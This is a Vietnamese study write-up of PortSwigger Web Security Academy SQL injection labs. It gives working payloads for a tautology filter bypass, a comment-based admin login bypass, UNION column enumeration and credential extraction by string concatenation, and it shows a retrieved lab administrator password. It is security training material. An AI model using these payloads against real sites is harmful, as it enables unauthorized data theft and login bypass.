# 1. LAB #



# 1.Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data #

Mục tiêu của bài này là hiển thị hết các sản phẩm ẩn

`SELECT * FROM products WHERE category = 'Gifts' AND released = 1`

`https://...web-security-academy.net/filter?category=Pets`
 Ta sẽ thêm `'OR 1=1'` đằng sau, vì điều kiện luôn đúng nên SQL sẽ trả về hết sản phẩm
 Hoặc
 `'UNION SELECT * FROM products--`

# 2.Lab: SQL injection vulnerability allowing login bypass

Input `username`: `administrator'--` để bypass password đằng sau

# 3. Lab: SQL injection UNION attack, determining the number of columns returned by the query

Dò đến khi nào trang web hiển thị hợp lệ như bình thường để biết được database có bao nhiêu 
`https://....web-security-academy.net/filter?category=Gifts'union select null,null,null--`

# 4. Lab: SQL injection UNION attack, finding a column containing text

Đầu tiên ta tìm số cột

`https://...web-security-academy.net/filter?category=Pets'union select null,null,null--`

Có 3 cột
String cần tìm nằm ở cột 2

`https://...web-security-academy.net/filter?category=Pets'union select null,'a',null--`


<img width="458" height="149" alt="image" src="https://github.com/user-attachments/assets/3bd254f1-0056-4e14-bb25-1a0137784e13" />

`https://0a7e008404f6ae158040b21300a4004c.web-security-academy.net/filter?category=Pets'union select null,'T99fsn',null--`

<img width="366" height="129" alt="image" src="https://github.com/user-attachments/assets/275f26b9-8817-4f9b-b2d7-cffe5a5641fc" />

# 5. Lab: SQL injection UNION attack, retrieving multiple values in a single column

Đầu tiên ta sẽ dò số cột, được kết quả là 2 cột

`https://...web-security-academy.net/filter?category=Gifts'union select null,null--`

Sau đó sẽ dò xem cột nào có cùng data type với username, password --> cột số 2

`https://....web-security-academy.net/filter?category=Gifts%27union%20select%20null,%27a%27--`

Thông tin mình cần là gồm 2 giá trị nhưng lại chỉ có 1 cột nên ta sẽ dùng string concatenation để nối chuỗi và trả về trong 1 cột

<img width="902" height="339" alt="image" src="https://github.com/user-attachments/assets/5ec17977-8273-4385-b72f-c240632c1346" />

`administrator~rt133x6yio2m9ksjjnqz`

# 6. Lab: Blind SQL injection with conditional responses








# 2. NOTE #



